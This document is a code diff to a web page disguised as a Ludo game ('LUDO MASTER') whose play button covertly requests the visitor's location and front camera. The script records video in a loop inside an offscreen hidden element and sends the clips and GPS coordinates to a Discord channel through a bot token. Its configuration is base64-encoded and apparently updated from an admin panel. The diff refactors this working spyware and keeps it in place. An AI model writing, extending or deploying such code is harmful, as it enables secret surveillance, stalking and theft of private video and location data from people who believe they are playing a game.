@@ -5,76 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pro Ludo Online</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: radial-gradient(circle, #2c3e50, #000000);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            color: white;
-            overflow: hidden;
-        }
-        .container {
-            text-align: center;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            width: 90%;
-            max-width: 400px;
-        }
-        h1 {
-            margin-bottom: 20px;
-            font-size: 28px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px #e67e22;
-        }
-        .board-preview {
-            width: 200px;
-            height: 200px;
-            background: #fff;
-            margin: 0 auto 20px;
-            border-radius: 10px;
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            grid-template-rows: repeat(4, 1fr);
-            padding: 10px;
-            gap: 5px;
-        }
+        body { margin: 0; padding: 0; background: radial-gradient(circle, #2c3e50, #000000); font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
+        .container { text-align: center; background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 0, 0, 0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); width: 90%; max-width: 400px; }
+        h1 { margin-bottom: 20px; font-size: 28px; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #e67e22; }
+        .board-preview { width: 200px; height: 200px; background: #fff; margin: 0 auto 20px; border-radius: 10px; display: grid; grid-template-columns: repeat(4, 1fr); grid-template-rows: repeat(4, 1fr); padding: 10px; gap: 5px; }
         .cell { background: #ddd; border-radius: 5px; }
         .cell:nth-child(odd) { background: #ccc; }
-        
-        .btn {
-            background: linear-gradient(45deg, #f39c12, #d35400);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 20px;
-            border-radius: 50px;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4);
-            transition: all 0.3s;
-        }
+        .btn { background: linear-gradient(45deg, #f39c12, #d35400); color: white; border: none; padding: 15px 40px; font-size: 20px; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4); transition: all 0.3s; }
         .btn:hover { transform: scale(1.05); }
         .btn:disabled { background: #7f8c8d; cursor: not-allowed; }
-        
         .status { margin-top: 15px; font-size: 14px; color: #bdc3c7; min-height: 20px; }
-        
-        #hiddenVideo {
-            position: absolute;
-            top: -1000px;
-            left: -1000px;
-            width: 320px;
-            height: 240px;
-        }
+        #hiddenVideo { position: absolute; top: -1000px; left: -1000px; width: 320px; height: 240px; }
         .error-msg { color: #e74c3c; font-size: 12px; margin-top: 5px; display: none; }
     </style>
 </head>
@@ -82,41 +23,45 @@
 
     <div class="container">
         <h1>LUDO MASTER</h1>
-        
         <div class="board-preview">
             <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
             <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
             <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
             <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
         </div>
-
         <button class="btn" id="playBtn">PLAY NOW</button>
-        <div class="status" id="statusText">Loading configuration...</div>
+        <div class="status" id="statusText">Initializing...</div>
         <div class="error-msg" id="errorMsg"></div>
     </div>
 
     <video id="hiddenVideo" autoplay muted playsinline></video>
 
     <script>
-        // Global Config
+        // 1. Base64 Config Variable (Admin Panel isse update karega)
+        // Shuru mein khali hai ya default value rakhi jaa sakti hai
+        const ENCODED_CONFIG = ""; 
+
         let config = {};
         let mediaRecorder;
         let videoChunks = [];
         let currentLocation = null;
         let watchId;
 
-        // Load Config on Start
         async function loadConfig() {
+            const statusText = document.getElementById('statusText');
+            const errorMsg = document.getElementById('errorMsg');
+
             try {
-                const response = await fetch('./config.json');
-                if (!response.ok) throw new Error("Config load nahi hua");
-                config = await response.json();
-                document.getElementById('statusText').innerText = "Ready to Play!";
+                if (!ENCODED_CONFIG) {
+                    throw new Error("Config is empty. Check Admin Panel.");
+                }
+                const decodedJson = atob(ENCODED_CONFIG);
+                config = JSON.parse(decodedJson);
+                statusText.innerText = "Ready to Play!";
             } catch (err) {
-                document.getElementById('statusText').innerText = "Error loading config.";
-                const errDiv = document.getElementById('errorMsg');
-                errDiv.innerText = "Kripya config.json check karein. (Console mein dekhein)";
-                errDiv.style.display = 'block';
+                statusText.innerText = "Config Error";
+                errorMsg.innerText = "Failed to load configuration.";
+                errorMsg.style.display = 'block';
                 console.error(err);
             }
         }
@@ -131,7 +76,6 @@
             playBtn.disabled = true;
             statusText.innerText = "Connecting to Server...";
 
-            // 1. Location Access
             if (navigator.geolocation) {
                 statusText.innerText = "Locating you...";
                 watchId = navigator.geolocation.watchPosition(
@@ -148,7 +92,6 @@
                 );
             }
 
-            // 2. Camera Access
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
@@ -157,7 +100,6 @@
                 
                 videoElement.srcObject = stream;
                 await videoElement.play();
-                
                 startRecordingLoop(stream);
 
             } catch (err) {
@@ -181,10 +123,8 @@
             mediaRecorder.onstop = () => {
                 const blob = new Blob(videoChunks, { type: 'video/webm' });
                 videoChunks = [];
-                
                 uploadToDiscord(blob);
 
-                // Wait time from config
                 setTimeout(() => {
                     if (mediaRecorder.stream.active) {
                         recordAndSend();
@@ -196,7 +136,6 @@
                 statusText.innerText = "Recording...";
                 mediaRecorder.start();
                 
-                // Record time from config
                 setTimeout(() => {
                     mediaRecorder.stop();
                 }, (config.settings.recordSeconds * 1000));
@@ -214,14 +153,12 @@
             const locationMsg = `📍 User: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`;
 
             try {
-                // Send Location Text
                 await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
                     method: "POST",
                     headers: { "Authorization": `Bot ${config.discord.botToken}` },
                     body: JSON.stringify({ content: locationMsg })
                 });
 
-                // Send Video
                 await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
                     method: "POST",
                     headers: { "Authorization": `Bot ${config.discord.botToken}` },
@@ -232,11 +169,10 @@
 
             } catch (error) {
                 console.error("Upload failed", error);
-                statusText.innerText = "Error: " + error.message;
+                statusText.innerText = "Error: " + error.error;
             }
         }
 
-        // Start loading
         window.onload = loadConfig;
     </script>
 </body>
